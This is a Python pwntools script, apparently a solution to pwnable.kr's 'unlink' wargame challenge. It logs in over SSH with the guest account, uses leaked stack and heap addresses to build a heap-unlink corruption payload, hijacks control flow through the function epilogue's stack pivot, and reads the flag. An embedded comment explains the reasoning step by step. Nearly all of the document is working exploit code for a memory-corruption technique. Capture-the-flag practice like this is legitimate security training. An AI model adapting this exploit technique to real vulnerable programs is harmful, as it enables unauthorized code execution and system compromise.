#! /usr/bin/python

from pwn import *

HOST = "pwnable.kr"
PORT = 2222
USER = "unlink"

s = ssh(host=HOST, user=USER,
        port=PORT, password='guest')

unlink = s.process('./unlink')

unlink.recvuntil("here is stack address leak: ")
stack_addr = unlink.recvuntil("\n")
unlink.recvuntil("here is heap address leak: ")
heap_addr = unlink.recvuntil("\n")

shell_addr = p32(0x80484eb)

'''
Layout in heap:
    malloc_prev_size
    malloc_size
    Obj A:
        fd
        bk
        buf[8]
    malloc_prev_size
    malloc_size
    Obj B:
        fd
        bk
        buf[8]

    Lets use FD->bk=BK to write our shell() pointer to eip on the stack.
    FD needs to point to 4 bytes before eip, because bk is FD+4 in the struct.
    BK needs to be equal to the location of the shell() address in heap

    payload = 'A'*8 to fill buf
    payload += 'A'*8 to overwrite malloc sizes
    payload += eip on stack - 4
    payload += heap addr of shell()

    Calculating eip on stack is easy:
        stack + (A + B + C + push ebp + push eip)-4(for struct offset)

    And for ease of calculation, lets store the shell address in
    the A.buf that we overwrite in the first part of the payload.

    payload = shell_addr + 'A'*4
    payload += 'A'*8
    payload += p32(int(stack_addr,16)+0x14-0x4)
    payload += p32(int(heap_addr,16)+0x8)

    Hmmmm, this doesnt work. Why?

    BK->fd=FD will write to shell() in .text, not allowed

    What about the other way, use BK->fd=FD to write to stack?
    This wont work when we think about it, FD->bk=BK will do the same thing.

    At this point, unsure how to proceed, so I looked up a hint.
    The hint says that there is something changed with the binary after calling unlink(). 
    That's enough for me to go on.
    Compile the unlink.c locally and compare to the binary that is on the game server.
    Compiled with: gcc -o unlink unlink.c -fno-stack-protector

    In the game server binary, there are a few extra assembly instructions:
    0x080485f2 <+195>:   call   0x8048504 <unlink>
    0x080485f7 <+200>:   add    esp,0x10
    0x080485fa <+203>:   mov    eax,0x0
    0x080485ff <+208>:   mov    ecx,DWORD PTR [ebp-0x4]
    0x08048602 <+211>:   leave
    0x08048603 <+212>:   lea    esp,[ecx-0x4]
    0x08048606 <+215>:   ret

    So it seems that after running unlink(), [ebp-0x4] is loaded into ecx,
    and then esp is loaded with the address of [ecx-0x4].

    So what does this mean? It means that if we:
        Store the pointer to shell() in heap, and
        Put the pointer to shell_in_heap+4 at ebp-4, then
        the address for shell will be loaded onto the stack and then ret is called.


    If we use FD->bk=BK to overwrite stack:
        FD = stack + local vars - 8
            Minus 4 bytes to set the FD pointer back to ebp, and then another
            4 bytes to account for the FD->bk struct offset.
        FD->bk = ebp
        BK = heap__addr + 4 extra bytes
        Bk->fd = BK = FD // We dont care about this heap offset getting trashed
'''

payload = shell_addr + 'A'*4
payload += 'A'*8
payload += p32(int(stack_addr,16)+0x14-0x8)
payload += p32(int(heap_addr,16)+0xc)

unlink.sendline(payload)
unlink.recvuntil("$")
unlink.sendline('cat flag')
print unlink.recvline()

#unlink.interactive()
unlink.close()
s.close()
